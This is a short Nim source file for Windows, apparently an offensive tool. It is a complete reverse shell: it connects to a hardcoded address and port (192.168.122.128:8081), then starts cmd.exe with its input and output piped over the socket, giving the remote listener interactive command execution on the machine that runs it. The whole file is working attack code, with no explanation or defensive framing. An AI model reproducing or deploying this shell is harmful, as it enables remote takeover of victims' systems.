import winim

const port: uint16 = 8081
const ip_addr = "192.168.122.128";

proc htons(x: uint16): uint16 =
  ## Converts 16-bit unsigned integers from network to host byte order. On
  ## machines where the host byte order is the same as network byte order,
  ## this is a no-op; otherwise, it performs a 2-byte swap operation.
  when cpuEndian == bigEndian: result = x
  else: result = (x shr 8'u16) or (x shl 8'u16)

proc MAKEWORD*(a, b: int32): int16 =
  result = cast[int16](a and 0xff'i32) or cast[int16](b shl 8'i32)

const SOCK_STREAM = 1

var wsa: winim.WSAData
var shell_addr: Sockaddr_in
var recv_server : char
var otro = recv_server.addr
var si: STARTUPINFO
var pi: PROCESS_INFORMATION


var init_result = WSAStartup(MAKEWORD(2, 2), wsa.addr)

if init_result != 0:
    echo ("WSAStartup failed: " & $GetLastError())

var shell = WSASocket(winim.AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)


shell_addr.sin_port = htons(port)
shell_addr.sin_family = AF_INET
shell_addr.sin_addr.S_addr = inet_addr(ip_addr)


var connect = WSAConnect(shell, cast[ptr SockAddr](addr(shell_addr)), int32(sizeof(shell_addr)), NULL, NULL, NULL, NULL)

if connect == -1:
    echo "[!] Connection to the target server failed, Please try again!\n"
else:
    recv(shell, otro, int32(sizeof(otro)), 0)
    si.cb = DWORD(sizeof(si))
    si.dwFlags = DWORD(STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW)
    si.hStdInput = shell
    si.hStdOutput = shell
    si.hStdError = shell
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, si.addr, pi.addr)
    WaitForSingleObject(pi.hProcess, INFINITE)
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)
    zeroMem(recv_server.addr,sizeof(recv_server))